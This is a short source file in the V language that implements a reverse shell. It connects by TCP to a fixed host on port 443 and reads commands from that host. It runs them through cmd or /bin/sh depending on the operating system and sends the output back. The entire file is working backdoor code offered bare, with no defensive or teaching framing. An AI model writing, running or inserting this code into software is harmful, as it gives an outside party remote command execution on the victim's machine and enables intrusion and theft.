import net
import os

fn main() {
   getconnected()
}
fn getconnected() {
        mut conn := net.dial_tcp("192.168.1.68:443") or {
        panic(err)
    }
    mut buf := []byte{len: 3072}
    mut args := ''
    for {
            nbytes := conn.read(mut buf) or {
                panic(err)
            }
            mut received := buf[0..nbytes].bytestr()
            //println('message received:  $received') 
            received = received.replace('\r\n','')
            if os.user_os() == 'windows' {
                args = "cmd /C" + " " + received
            } else if os.user_os() == 'linux' {
                args = "/bin/sh -c" + " " + received
            }
            res := os.execute(args) 
            //println(res.output)
            conn.write_string(res.output) or {
                panic(err)
            }
    }
    conn.close() or { panic(err) }
    
}